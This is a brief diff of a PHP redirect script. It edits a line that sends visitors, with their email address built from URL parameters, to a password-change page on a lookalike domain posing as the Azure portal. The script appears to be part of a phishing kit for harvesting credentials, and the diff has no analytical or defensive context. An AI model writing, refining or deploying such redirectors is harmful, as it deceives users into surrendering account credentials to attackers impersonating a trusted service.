@@ -7,5 +7,4 @@ function Redirect($url, $permanent = false)
  }
  exit();
 }
-Redirect("https://azure.portal.com.rosepetalshomes.com/auth/changepassword.php=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
-?>
+Redirect("https://azure.portal.com.rosepetalshomes.com/auth/changepassword.php/?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
